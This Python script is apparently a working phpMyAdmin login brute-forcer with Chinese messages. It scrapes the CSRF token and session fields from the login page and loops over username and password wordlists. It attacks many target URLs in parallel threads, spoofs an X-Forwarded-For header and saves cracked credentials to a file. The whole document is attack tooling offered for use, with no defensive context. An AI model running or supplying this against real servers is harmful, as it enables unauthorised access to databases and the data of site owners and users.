#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import threading
import time
import re


requests.packages.urllib3.disable_warnings()

def file_read(path):
	with open(path,'r') as f:
		contents = f.readlines()
	return contents

def file_write(path,content):
	with open(path,'a+',encoding='utf-8') as f:
		f.write(content+'\n')
	return content

def connect(url):
	i = 2
	while i != 0:
		if 'https://' in url or 'http://' in url:
			try:
				response = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=60,allow_redirects=False)
				return url
			except Exception as e:
				i = i - 1
				error = str(e)
				time.sleep(1)
		else:
			url = 'https://' + url
			try:
				response = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=60,allow_redirects=False)
				return url
			except:
				url = url.replace('https://','http://')
				try:
					response = requests.get(url=url,headers=headers,proxies=proxies,timeout=60,allow_redirects=False)
					return url
				except Exception as e:
					url = url.replace('http://','')
					i = i - 1
					error = str(e)
					time.sleep(1)
	print(url,'----- 连接出错！')
	file_write('log.txt',url+' ----- 连接出错 ----- '+error)
	return ''

def poc(url,user,pwd):
	session = requests.session()
	try:
		re1 = session.get(url=url,headers=headers,proxies=proxies,verify=False)
	except:
		print(file_write('log.txt',url+'  连接出错1 '+user+':'+pwd))
		return ''
	try:
		token = re.search('<input type="hidden" name="token" value=".*?"',re1.content.decode()).group().replace('<input type="hidden" name="token" value="','').replace('"','')
	except:
		token = ''
	try:
		setsession = re.search('<input type="hidden" name="set_session" value=".*?"',re1.content.decode()).group().replace('<input type="hidden" name="set_session" value="','').replace('"','')
	except:
		setsession = ''
	if setsession != '':
		data = 'set_session=' + setsession + '&pma_username=' + user + '&pma_password=' + pwd + '&server=1&target=index.php&token=' + token
	else:
		data = 'pma_username=' + user + '&pma_password=' + pwd + '&server=1&target=index.php&token=' + token
	url = url + 'index.php'
	try:
		re2 = session.post(url=url,headers=headers,proxies=proxies,verify=False,data=data)
	except:
		print(file_write('log.txt',url+'  连接出错2 '+user+':'+pwd))
		return ''
	if re2.status_code == 200 and 'input_username' not in re2.text:
		print(file_write('ok.txt','success: '+url+' '+user+':'+pwd))
		return 'ok'
	else:
		return ''

def bp(url):
	if username != None and password != None:
		result = poc(url,username,password)
	if usernames != None and passwords != None:
		for user in usernames:
			user = user.replace('\n','')
			for pwd in passwords:
				pwd = pwd.replace('\n','')
				result = poc(url,user,pwd)
				if result != '':
					break
			if result != '':
				break	
	if username != None and passwords != None:
		for pwd in passwords:
			pwd = pwd.replace('\n','')
			result = poc(url,username,pwd)
			if result != '':
				break
	if usernames != None and password != None:
		for user in usernames:
			user = user.replace('\n','')
			result = poc(url,user,password)
			if result != '':
				break
	if result == '':
		print(file_write('log.txt',url+' ----- 爆破失败'))

def pl(url,se):
	se.acquire()
	url = connect(url)
	if url != '':
		if url.endswith('/') == False:
			url = url + '/'
		bp(url)
	se.release()

if __name__ == '__main__':
	ap = argparse.ArgumentParser()
	ap.add_argument('-u','--url',help='xx.com or http://xx.com')
	ap.add_argument('-f','--file',help='file path')
	ap.add_argument('-p','--proxy',help='http://127.0.0.1:8080')
	ap.add_argument('-t','--thread',help='xiancheng 1',type=int,default=1)
	ap.add_argument('-user','--username',help='one username')
	ap.add_argument('-pwd','--password',help='one password')
	ap.add_argument('-users','--usernames',help='username zidian path')
	ap.add_argument('-pwds','--passwords',help='password zidian path')
	args = vars(ap.parse_args())
	headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Accept-Encoding':'gzip, deflate','Content-Type':'application/x-www-form-urlencoded','X-Forwarded-For':'1.1.1.1','Connection':'close'}
	if args['proxy'] != None:
		proxies = {'http':args['proxy'],'https':args['proxy']}
	else:
		proxies = {}
	if args['username'] != None:
		username = args['username']
		usernames = None
	elif args['usernames'] != None:
		usernames = file_read(args['usernames'])
		username = None
	else:
		print('请输入用户名或用户名字典！')
		exit()
	if args['password'] != None:
		password = args['password']
		passwords = None
	elif args['passwords'] != None:
		passwords = file_read(args['passwords'])
		password = None
	else:
		print('请输入密码或密码字典！')
		exit()
	if args['file'] != None:
		se = threading.BoundedSemaphore(args['thread'])
		for u in file_read(args['file']):
			t = threading.Thread(target=pl,args=(u.replace('\n',''),se,))
			t.start()
	if args['url'] != None:
		url = connect(args['url'])
		if url != '':
			if url.endswith('/') == False:
				url = url + '/'
			bp(url)
